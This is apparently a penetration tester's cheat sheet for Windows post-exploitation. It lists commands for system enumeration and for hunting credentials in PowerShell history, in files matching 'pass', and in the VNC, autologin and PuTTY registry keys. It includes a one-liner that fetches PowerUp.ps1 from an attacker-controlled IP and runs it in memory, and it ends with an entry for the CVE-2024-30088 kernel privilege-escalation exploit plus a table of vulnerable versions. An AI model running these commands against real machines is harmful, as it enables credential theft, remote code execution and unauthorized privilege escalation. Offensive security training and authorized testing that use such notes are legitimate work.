```
#set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;  
```

# Survey
## whoami  

```powershell
whoami
```

```powershell
whoami /groups
```

```powershell
whoami /priv  
```
## environment variables  
```powershell
Get-ChildItem env:* | Sort-Object Name  
```
## users on box  
``` powershell
net user  
```  
## system info  
```powershell
systeminfo  
```

```powershell
Get-ComputerInfo
```
## Network Interfaces
```powershell
ipconfig /all
```

```powershell
route print  
```
## Network Connections  
```
netstat -anop tcp  
```
## Running Processes  
```
Get-Process  
```
### If elevated  
```
Get-Process -IncludeUserName | Sort-Object UserName  
  
#get process of a specific pid  
Get-Process -Id 8168  
```
  
## Get Services  
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Sort-Object State  
```

```powershell
net start  
```

## Get Scheduled Tasks  
```powershell
schtasks /query /v /fo LIST | more  
```
```powershell
get-scheduledtask 
```

## Powershell History  
```powershell
Get-History
```
```powershell
(Get-PSReadlineOption).HistorySavePath 
```
```powershell
Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue  
```

# Files

## Look for files with interesting extensions  
```
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx -File -Force -Recurse -ErrorAction SilentlyContinue  
```
  
## Look for window installation files (unattended.xml)  

```powershell
Get-ChildItem -Path C:\ -Include Unattend.xml,sysprep.inf,sysprep.xml -File -Recurse -ErrorAction SilentlyContinue  
```


## get files with keyword pass in it  
```powershell
findstr /M /S "pass" "C:\*"
```

```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.ini,*.xls,*.xlsx,*.doc,*.docx,*cred*,*vnc*,*.config* -File -Recurse -ErrorAction SilentlyContinue -Force | select-string "pass"  
```

## Temp Files  
```
Get-ChildItem "C:\Users\*\AppData\Local\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue  
```

## Deleted Files  
```
Get-ChildItem "C:\`$Recycle.Bin\*" -Recurse -Force -ErrorAction SilentlyContinue  
```
  
# Registry  

## VNC
```powershell
reg query "HKCU\Software\ORL\WinVNC3\Password"  
```
## Windows Autologin  
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  
```
## SNMP Parameters  
```powershell
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  
 ```
## Putty  
```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  
```

## Search for password in Registry  
```powershell
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s  
```
## Recent Items  
```powershell
Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue  
```
## PS History  
```powershell
Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue  
```


# PowerUp  
```
iex(iwr -uri http://10.10.16.31/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks
```


# Windows Kernel Exploits

## CVE-2024-30088

Windows Kernel Elevation of Privilege Vulnerability

https://github.com/ramzihafiz/cve-2024-30088-binary

```powershell
Get-HotFix
```

### Affected Versions

| Version                  | Patch Level (Up to excluding) |
| ------------------------ | ----------------------------- |
| Windows_10_1507          | **10.0.10240.20680**          |
| Windows_10_1607          | **10.0.14393.7070**           |
| Windows_10_1809          | **10.0.17763.5936**           |
| Windows_10_21h2          | **10.0.19044.4529**           |
| Windows_10_22h2          | **10.0.19044.4529**           |
| Windows_11_21h2          | **10.0.22000.3019**           |
| Windows_11_22h2          | **10.0.22631.3737**           |
| Windows_11_23h2          | **10.0.22631.3737**           |
| Windows_Server_2016      | **10.0.14393.7070**           |
| Windows_Server_2019      | **10.0.17763.5936**           |
| Windows_Server_2022      | **10.0.20348.2522**           |
| Windows_Server_2022_23h2 | **10.0.25398.950**            |
